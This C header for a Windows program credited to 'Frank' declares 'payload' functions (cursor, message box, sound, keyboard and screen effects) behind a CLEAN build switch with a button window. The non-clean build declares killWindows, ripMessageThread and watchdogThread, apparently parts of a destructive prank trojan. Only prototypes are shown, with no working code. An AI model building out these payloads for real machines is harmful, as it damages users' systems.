//Elon.h made by Frank 

#define CLEAN

#ifdef CLEAN

#pragma comment(linker,"\"/manifestdependency:type='win32' \
name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")


#define BTNWIDTH 200
#define BTNHEIGHT 30
#define COLUMNS 2
#define ROWS nPayloads/COLUMNS
#define SPACE 10
#define WINDOWWIDTH COLUMNS * BTNWIDTH + (COLUMNS + 1)*SPACE
#define WINDOWHEIGHT ROWS * BTNHEIGHT + (ROWS + 1)*SPACE + 32
#endif

#pragma once

#include <Windows.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <Psapi.h>
#include <CommCtrl.h>

#include "data.h"
#include "Payloads.h"

int random();
void strReverseW(LPWSTR str);

DWORD WINAPI payloadThread(LPVOID);

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

#ifndef CLEAN
void killWindows();
void killWindowsInstant();

DWORD WINAPI ripMessageThread(LPVOID);
DWORD WINAPI watchdogThread(LPVOID);
#else
DWORD WINAPI keyboardThread(LPVOID lParam);
extern BOOLEAN enablePayloads;
BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam);
#endif

int payloadExecute(PAYLOADFUNC);
int payloadCursor(PAYLOADFUNC);
int payloadBlink(PAYLOADFUNC);
int payloadMessageBox(PAYLOADFUNC);
DWORD WINAPI messageBoxThread(LPVOID);
LRESULT CALLBACK msgBoxHook(int, WPARAM, LPARAM);
int payloadChangeText(PAYLOADFUNC);
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
int payloadSound(PAYLOADFUNC);
int payloadPuzzle(PAYLOADFUNC);
int payloadKeyboard(PAYLOADFUNC);
int payloadPIP(PAYLOADFUNC);
int payloadDrawErrors(PAYLOADFUNC);

extern int scrw, scrh;
